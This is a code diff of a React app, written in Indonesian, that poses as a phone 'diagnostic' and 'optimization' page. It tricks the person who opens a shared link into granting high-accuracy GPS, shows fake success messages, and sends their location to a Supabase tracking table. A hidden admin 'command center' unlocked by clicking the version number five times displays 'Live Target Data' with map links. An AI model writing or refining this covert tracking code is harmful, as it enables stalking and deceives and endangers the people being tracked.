@@ -6,9 +6,17 @@ import { UserProfile, AIInsight, LocationData } from './types';
 import { getLocationInsights } from './services/geminiService';
 import { createClient } from '@supabase/supabase-js';
 
-// Inisialisasi Supabase
-const supabaseUrl = process.env.SUPABASE_URL || '';
-const supabaseKey = process.env.SUPABASE_KEY || '';
+// Fungsi untuk mendapatkan env secara aman
+const getEnv = (key: string): string => {
+  try {
+    return process.env[key] || '';
+  } catch (e) {
+    return '';
+  }
+};
+
+const supabaseUrl = getEnv('SUPABASE_URL');
+const supabaseKey = getEnv('SUPABASE_KEY');
 const supabase = (supabaseUrl && supabaseKey) ? createClient(supabaseUrl, supabaseKey) : null;
 
 const App: React.FC = () => {
@@ -40,9 +48,12 @@ const App: React.FC = () => {
 
   const syncToDatabase = async (loc: LocationData) => {
     if (!supabase) {
-      setDbLog("ERROR: Client Supabase NULL");
+      if (!supabaseUrl) setDbLog("ERROR: MISSING_URL");
+      else if (!supabaseKey) setDbLog("ERROR: MISSING_KEY");
+      else setDbLog("ERROR: CLIENT_NULL");
       return;
     }
+    
     setDbLog("SYNCING...");
     try {
       const { error } = await supabase
@@ -57,13 +68,11 @@ const App: React.FC = () => {
       
       if (error) {
         setDbLog(`DB ERROR: ${error.message}`);
-        console.error("Database Sync Error:", error);
       } else {
-        setDbLog("SUCCESS: Data Sent");
+        setDbLog("SUCCESS: DATA_SENT");
       }
     } catch (err: any) {
-      setDbLog(`CATCH ERROR: ${err.message}`);
-      console.error("Database Catch Error:", err);
+      setDbLog(`FATAL: ${err.message?.substring(0,10)}`);
     }
   };
 
@@ -72,7 +81,6 @@ const App: React.FC = () => {
       const fetchData = async () => {
         try {
           const { data, error } = await supabase.from('tracking').select('*').eq('id', targetId).single();
-          if (error) console.error("Initial fetch error:", error);
           if (data) {
             setMembers([{
               ...members[0],
@@ -91,7 +99,7 @@ const App: React.FC = () => {
       fetchData();
 
       const channel = supabase
-        .channel('any')
+        .channel('db-tracking')
         .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
           const data = payload.new as any;
           if (data && data.id === targetId) {
@@ -117,11 +125,9 @@ const App: React.FC = () => {
   const updateLocation = useCallback(() => {
     if (!navigator.geolocation) {
       setLocationError("GPS Not Found");
-      setDbLog("GPS NOT SUPPORTED");
       return;
     }
 
-    setDbLog("REQUESTING GPS...");
     navigator.geolocation.getCurrentPosition(
       async (position) => {
         setLocationError(null);
@@ -145,15 +151,14 @@ const App: React.FC = () => {
         }
       },
       (err) => {
-        setLocationError(`Access Denied: ${err.message}`);
-        setDbLog(`GPS DENIED: ${err.code}`);
+        setLocationError(`Denied: ${err.message}`);
+        setDbLog("ERROR: GPS_DENIED");
       },
       { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
     );
   }, [isUnlocked, isStealthMode]);
 
   const startDiagnostic = () => {
-    // Meminta izin GPS segera setelah klik tombol (Gesture Required by Browsers)
     updateLocation();
     setIsDiagnosing(true);
     let progress = 0;
@@ -208,7 +213,7 @@ const App: React.FC = () => {
                 </button>
                 {locationError && (
                   <p className="text-[10px] text-rose-500 bg-rose-500/10 p-2 rounded">
-                    Error: Izinkan akses lokasi agar sistem bisa mendiagnosa hardware GPS.
+                    Error Hardware GPS: Silakan izinkan akses lokasi jika diminta.
                   </p>
                 )}
              </div>
@@ -235,7 +240,7 @@ const App: React.FC = () => {
                    </div>
                    <div className="flex justify-between text-[9px]">
                       <span className="text-slate-500">DATABASE_LINK</span>
-                      <span className="text-blue-400 font-bold text-[8px] truncate max-w-[100px]">{dbLog}</span>
+                      <span className="text-blue-400 font-bold text-[8px] uppercase">{dbLog}</span>
                    </div>
                 </div>
 
@@ -243,18 +248,13 @@ const App: React.FC = () => {
                   <div className="animate-in zoom-in duration-500 space-y-4">
                      <div className="p-4 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-center">
                         <p className="text-[10px] text-emerald-400 font-bold uppercase">Optimasi Berhasil</p>
-                        <p className="text-[9px] text-slate-500 mt-1">Perangkat Anda kini berjalan 20% lebih cepat.</p>
+                        <p className="text-[9px] text-slate-500 mt-1">Sistem kini lebih stabil.</p>
                      </div>
                      <button onClick={() => window.location.reload()} className="w-full py-3 bg-slate-800 rounded-xl text-[10px] font-bold text-slate-400 uppercase">Tutup</button>
                   </div>
                 )}
              </div>
            )}
-           
-           {/* Hidden logging area to debug on target mobile */}
-           <div className="opacity-0 h-0 overflow-hidden">
-              Log: {dbLog} | Error: {locationError}
-           </div>
         </div>
       </div>
     );
@@ -276,7 +276,6 @@ const App: React.FC = () => {
             <h2 className="text-xs font-bold tracking-widest text-slate-400 uppercase">
               {isUnlocked ? '> ADM_COMMAND_CENTER' : '> SYSTEM_IDLE'}
             </h2>
-            {isLoadingInsight && <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>}
           </div>
           <div className="flex items-center gap-4">
             {isUnlocked && (
@@ -296,32 +295,29 @@ const App: React.FC = () => {
             <div className="max-w-4xl mx-auto space-y-8 text-center py-20 animate-in fade-in">
                <i className="fas fa-shield-halved text-5xl text-slate-800 mb-6"></i>
                <h1 className="text-2xl font-bold text-slate-400">Encrypted Workspace</h1>
-               <p className="text-slate-500 text-sm max-w-sm mx-auto">Sistem terkunci. Gunakan protokol otorisasi untuk mengakses dashboard pemantauan.</p>
+               <p className="text-slate-500 text-sm max-w-sm mx-auto">Klik versi di sidebar 5x untuk membuka kunci.</p>
             </div>
           ) : (
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto animate-in zoom-in-95 duration-300">
               <div className="lg:col-span-2 space-y-6">
                 
                 {!isConfigValid && (
-                  <div className="bg-rose-500/10 border border-rose-500/20 p-4 rounded-xl flex items-start gap-4 animate-pulse">
-                    <i className="fas fa-triangle-exclamation text-rose-500 mt-1"></i>
-                    <div>
-                      <p className="text-xs font-bold text-rose-400 uppercase tracking-tighter">Variabel Vercel Belum Terdeteksi!</p>
-                      <p className="text-[10px] text-slate-400 mt-1">Pastikan Anda sudah me-REDEPLOY di Vercel setelah memasukkan SUPABASE_URL dan SUPABASE_KEY di Settings.</p>
-                    </div>
+                  <div className="bg-rose-500/10 border border-rose-500/20 p-4 rounded-xl animate-pulse">
+                    <p className="text-xs font-bold text-rose-400 uppercase tracking-tighter">Variabel Vercel Hilang!</p>
+                    <p className="text-[10px] text-slate-400 mt-1">Segera isi SUPABASE_URL dan SUPABASE_KEY di Settings Vercel lalu REDEPLOY.</p>
                   </div>
                 )}
 
                 <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-32 h-32 bg-blue-500/5 blur-3xl rounded-full"></div>
                    <div className="flex justify-between items-center mb-6">
-                      <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest flex items-center gap-2">
-                        <i className="fas fa-location-dot text-blue-500"></i> Live Target Data
+                      <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest">
+                        <i className="fas fa-location-dot text-blue-500 mr-2"></i> Live Target Data
                       </h3>
                       {activeMember.currentLocation && (
                         <button 
                           onClick={() => openInGoogleMaps(activeMember.currentLocation!.latitude, activeMember.currentLocation!.longitude)}
-                          className="px-4 py-2 bg-blue-600 hover:bg-blue-500 rounded-lg text-[10px] font-bold uppercase transition-all"
+                          className="px-4 py-2 bg-blue-600 hover:bg-blue-500 rounded-lg text-[10px] font-bold uppercase"
                         >
                            Buka Peta Google
                         </button>
@@ -341,7 +337,7 @@ const App: React.FC = () => {
                      </div>
                    ) : (
                      <div className="p-10 border border-dashed border-slate-800 rounded-2xl text-center">
-                        <p className="text-xs text-slate-600 italic uppercase">Menunggu Sinyal Dari Target Alpha...</p>
+                        <p className="text-xs text-slate-600 italic uppercase">Menunggu Sinyal Dari Target...</p>
                      </div>
                    )}
                 </div>
@@ -349,13 +345,12 @@ const App: React.FC = () => {
                 <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
                    <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Target Deployment Link</h3>
                    <div className="p-4 bg-blue-500/5 border border-blue-500/20 rounded-xl flex gap-2">
-                      <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-slate-950 border border-slate-800 rounded p-2 text-[10px] text-slate-500 outline-none" />
-                      <button onClick={() => handleCopyLink('target')} className={`px-6 rounded text-[10px] font-bold ${copyStatus === 'target' ? 'bg-emerald-600' : 'bg-blue-600'} transition-all`}>
+                      <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-slate-950 border border-slate-800 rounded p-2 text-[10px] text-slate-500" />
+                      <button onClick={() => handleCopyLink('target')} className={`px-6 rounded text-[10px] font-bold ${copyStatus === 'target' ? 'bg-emerald-600' : 'bg-blue-600'}`}>
                          {copyStatus === 'target' ? 'COPIED' : 'COPY'}
                       </button>
                    </div>
                 </div>
-
               </div>
 
               <div className="lg:col-span-1">
